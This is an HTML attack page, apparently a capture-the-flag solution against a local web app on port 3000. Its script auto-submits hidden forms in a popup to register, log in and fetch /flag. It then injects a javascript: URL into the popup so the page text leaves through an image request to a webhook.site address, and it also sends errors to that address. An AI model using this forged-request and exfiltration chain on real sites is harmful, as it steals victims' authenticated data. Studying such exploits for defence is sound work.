<!DOCTYPE html>
<html>
<body>
<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
  <input name="username" value="poptest3">
  <input name="password" value="poptest3">
</form>

<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
  <input name="username" value="poptest3">
  <input name="password" value="poptest3">
</form>

<form id="flagForm" method="GET" action="http://localhost:3000/flag" target="popup">
</form>

<script>
var popup = window.open('about:blank', 'popup');

document.getElementById('regForm').submit();

setTimeout(function(){
  document.getElementById('loginForm').submit();
}, 200);

setTimeout(function(){
  document.getElementById('flagForm').submit();
}, 500);

// flag를 읽는 대신, popup에서 webhook으로 직접 보내게 하자
setTimeout(function(){
  try {
    // popup 안에서 스크립트 실행
    popup.location.href = "javascript:new Image().src='https://webhook.site/showontest?flag='+encodeURIComponent(document.body.innerText)";
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
  }
}, 800);
</script>
</body>
</html>
